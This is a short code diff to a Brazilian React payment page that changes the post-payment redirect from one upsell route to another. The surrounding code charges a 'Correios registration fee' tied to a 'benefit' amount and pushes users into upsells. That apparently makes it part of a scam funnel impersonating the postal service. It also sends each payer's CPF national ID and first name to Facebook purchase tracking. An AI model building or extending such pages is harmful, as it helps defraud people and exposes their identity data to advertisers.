@@ -115,7 +115,7 @@ const Pagamento = () => {
           fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Correios' });
           fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Correios' });
           toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
-          navigate(buildUrlWithUtm("/upsell/1"), { state: { cpfData, valorBeneficio, protocolo } });
+          navigate(buildUrlWithUtm("/upsell-info/1"), { state: { cpfData, valorBeneficio, protocolo } });
         }
       } catch {}
     }, 15000);
@@ -136,7 +136,7 @@ const Pagamento = () => {
           fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Correios' });
           fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Correios' });
           toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
-          navigate(buildUrlWithUtm("/upsell/1"), { state: { cpfData, valorBeneficio, protocolo } });
+          navigate(buildUrlWithUtm("/upsell-info/1"), { state: { cpfData, valorBeneficio, protocolo } });
         } else {
           toast({ title: "Aguardando pagamento", description: "Ainda não identificamos. Tente em alguns segundos.", variant: "destructive" });
         }
